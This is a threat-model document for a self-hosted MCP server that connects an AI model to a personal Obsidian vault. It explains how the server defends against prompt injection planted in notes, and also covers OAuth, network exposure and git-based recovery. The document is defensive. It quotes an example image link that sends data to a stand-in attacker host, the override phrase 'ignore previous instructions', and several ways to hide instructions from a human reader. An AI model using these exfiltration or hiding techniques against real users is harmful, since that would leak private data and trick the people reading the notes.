# Threat model

If you host this, you are exposing personal notes to the internet — behind
authentication, but exposed. This document says what protects them, how, and
what it honestly does not protect against.

## Assets

1. **Vault content** — personal notes, journals, project logs. Confidentiality
   is the primary asset.
2. **Vault integrity** — notes must not be silently destroyed or corrupted;
   sync propagates any damage to every device within seconds.
3. **Credentials** — OAuth tokens and grants in Workers KV, the origin shared
   secret, the consent password, sync credentials on the VPS.
4. **The VPS itself** — it holds a synced copy of the vault and the sync
   credentials.

## Adversaries

- **Internet scanners / opportunistic attackers** who find the public
  endpoints. Assumed to know both URLs (Worker and tunnel hostname).
- **Authors of malicious content that ends up in the vault** — the dominant
  adversary, detailed below.
- **A rogue OAuth client** trying to get itself authorized through dynamic
  client registration.
- **An attacker who compromises the VPS** through some unrelated vector.

## The dominant threat: prompt injection via vault content

This threat is structural, not exotic. Much of a real vault was **not written
by its owner**: web clippings, pasted PDFs, notes shared by other people. All
of it is untrusted input that gets fed to a model with tools. A hostile note
can contain instructions invisible to the human reader but perfectly legible
to the model.

**The defense is channel closure, not detection.** Detecting injections
reliably is not possible; removing what an injection could accomplish is.

1. **Minimal tool inventory.** There is no HTTP request, no shell, no
   JavaScript execution — deliberately. Every candidate tool must answer:
   *what happens if a malicious note gets this called with arguments of its
   choosing?* With the current tool set, a fully successful injection can, at
   worst, put junk into notes or shuffle them around — a recoverable incident,
   not a loss: it cannot exfiltrate content over the network, and it cannot
   destroy existing notes (`create_note` and `move_note` refuse to overwrite;
   `append_to_note`/`append_to_section` only insert; `edit_note` requires an
   exact unique match of existing text; `delete_note` is a move into the
   vault's own `.trash/`, never an unlink).
2. **Remote-image de-embed on write.** The one leak channel that survives
   item 1: a written note containing `![](https://attacker.example/?q=SECRET)`
   would make the *owner's own Obsidian client* fetch that URL — data in the
   query string — the moment they open the note. So on every write, remote
   markdown images (inline, reference-style and shorthand), `data:` images and
   HTML fetch vectors (`img`, `source`, `video`, `audio`, `iframe`, `embed`,
   `object`, `link`, including remote `srcset` candidates) are de-embedded
   into plain links or replaced with an `[external content removed: …]`
   marker. Local, vault-relative images pass through untouched.
3. **Sanitization on read.** Before note content reaches the model, the
   channels for human-invisible instructions are stripped: HTML comments
   (including unterminated ones), `<script>`/`<style>` blocks, elements hidden
   via `hidden` or CSS (`display:none`, `visibility:hidden`, `font-size:0`,
   `opacity:0`), invisible/bidi control characters, and the Unicode tag block
   (U+E0000–U+E007F — an entire invisible alphabet). When anything was
   removed, the tool result says so (`[sanitizer] removed: …`), so altered
   content is never silent.
4. **Folder provenance.** Folders holding imported content
   (`LOW_TRUST_FOLDERS`) are excluded from search by default; the model only
   reaches into them when explicitly asked about clipped material. Untrusted
   content has to be invited in, not stumble in.

### Why keyword filters only warn and never block

The server runs heuristics over returned content ("ignore previous
instructions", suspicious data-bearing URLs, long base64 runs, …) and appends
`[warning]` lines when they fire. They **never block**, for two reasons:
keyword filters are trivial to bypass, so blocking buys no security; and they
false-positive on the owner's own legitimate notes *about* prompt injection.
Their job is to alert the owner, not to enforce anything.

## Network and authentication

- **The public URL is not a secret.** It sits in client settings, transits
  third-party infrastructure and appears in logs. The system is designed so
  that knowing it grants nothing.
- **OAuth 2.1 with PKCE at the edge**, built on an established library rather
  than hand-rolled — the OAuth layer is the last place to be original.
- **Fixed `redirect_uri` allowlist.** Dynamic client registration is open by
  specification, so without this an attacker could register their own client
  with their own redirect URI and lure the owner into authorizing it on the
  legitimate domain. Because this is a single-user system, the allowlist can
  simply be fixed to the real Claude callback URLs — which eliminates the
  entire rogue-client class rather than mitigating it. Dynamic registration
  itself stays enabled only for client compatibility.
- **Consent password**: high-entropy credential, compared in constant time
  (SHA-256 digests via `crypto.subtle`), attempt-limited at the edge (5 tries
  per 15 minutes per IP, then 429).
- **The origin answers 404 without the shared secret** — not 401. A 401 would
  confirm something worth authenticating against exists; a bare 404 makes the
  tunnel hostname look like nothing. The MCP server itself binds to loopback
  only; the tunnel is outbound-only, so the VPS exposes no inbound port.
- **Filesystem containment**: every path a tool receives is validated at a
  single chokepoint — markdown files only, no absolute paths, no `..`, no
  hidden folders (`.obsidian`, `.git` included), symlinks resolved and
  checked against the vault root. The process runs as a dedicated
  unprivileged user.
- **The Worker never stores vault content.** Content does pass *through* it
  in transit (it is the proxy), but the only state it keeps is OAuth
  grants/tokens and rate-limit counters in KV.

## Recovery: git autocommit

A timer commits the vault to a local git repository every 30 minutes. This
prevents nothing — it is what makes "the worst case is junk in a note" a true
statement instead of optimism. Without a revert path, the same sentence would
be wishful thinking. Restore procedures are in
[operations.md](operations.md). The history stays local; pushing anywhere is
the owner's call.

## Residual risks — stated honestly

- **VPS compromise exposes the synced vault.** Whatever is synced to the
  machine is readable by whoever owns the machine. Mitigations: sync a
  **subset** of the vault rather than all of it, and keep **no secrets inside
  the vault** (no API keys, no passwords in notes — this is worth a habit
  change regardless).
- **Sanitization is best-effort.** HTML stripping via patterns has known
  limits (e.g. nested same-name hidden tags); new invisible-content tricks
  will appear. The sanitizer reduces the attack surface; the tool inventory
  is what caps the damage.
- **Heuristics are bypassable by design** — see above; they are alarms, not
  walls.
- **You trust Cloudflare.** The edge terminates TLS, so tool traffic is
  visible to the Worker runtime, and tokens live in KV. That is the price of
  not exposing the VPS directly; if it is unacceptable, this architecture is
  not for you.
- **Junk writes are possible until noticed.** A successful injection can
  still create noise notes or append noise to existing ones. Audit logging
  (every tool call is logged) and the 30-minute git history bound the damage
  and make it visible; they don't prevent it.
